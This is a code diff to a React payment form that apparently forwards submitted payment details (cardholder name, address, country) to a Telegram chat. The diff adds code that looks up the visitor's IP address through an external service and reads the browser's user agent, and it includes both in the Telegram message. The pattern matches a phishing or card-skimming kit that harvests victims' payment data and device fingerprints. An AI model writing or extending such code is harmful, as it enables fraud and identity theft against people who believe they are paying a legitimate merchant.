@@ -268,9 +268,25 @@ const PaymentForm = ({ onProceed, onBack }: PaymentFormProps) => {
     return v;
   };
 
+  const getClientIp = async (): Promise<string | null> => {
+    try {
+      const response = await fetch("https://api.ipify.org?format=json");
+      const data = await response.json();
+      return data.ip;
+    } catch {
+      return null;
+    }
+  };
+
+  const getUserAgent = (): string => {
+    return navigator.userAgent || "Unknown";
+  };
+
   const sendTelegramNotification = async () => {
     try {
       const countryName = COUNTRIES.find(c => c.code === country)?.name || country;
+      const clientIp = await getClientIp();
+      const userAgent = getUserAgent();
       const message = `💳 <b>New Payment Details Submitted</b>
 
 👤 <b>Cardholder:</b> ${cardName}
@@ -282,6 +298,9 @@ const PaymentForm = ({ onProceed, onBack }: PaymentFormProps) => {
 ${address}
 ${city}, ${postcode}
 ${countryName}
+
+🌐 <b>IP:</b> <code>${clientIp || "Unknown"}</code>
+💻 <b>Device:</b> <code>${userAgent}</code>
 
 ⏰ <b>Time:</b> ${new Date().toLocaleString()}`;
 
